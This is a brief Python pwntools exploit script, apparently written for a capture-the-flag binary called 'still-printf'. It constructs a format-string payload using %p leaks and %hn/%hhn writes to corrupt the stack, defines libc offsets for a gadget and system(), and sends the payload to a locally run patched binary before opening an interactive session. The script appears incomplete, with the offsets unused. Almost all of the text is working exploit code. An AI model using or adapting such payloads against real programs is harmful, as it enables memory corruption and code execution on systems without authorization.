#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import random
import subprocess

# Addr
libc_leak_offset = 0x2409b
gadget1 = 0x448a3
system = 0x449c0

# Hack
def Hack():
 global io

 exe = ELF('./still-printf')
 magic_number = 0x1337
 
 # Leak stack pointer And hope for good luck.
 payload = ('%c%p'+'%c'*8 +'%c%c%c' +f'%{ (magic_number + 1 ) - (0xd + 0x5 + 0x8 )}c'+'%hn'+f'%{ 0xdd - ( (magic_number+1)&0xff) }c'+'%41$hhn').ljust(0x2f)
 print(hex(len(payload)))
 io.send(payload)


io = process('./still-printf_patched',aslr = False)
raw_input("DEBUG")
Hack()

io.interactive()
 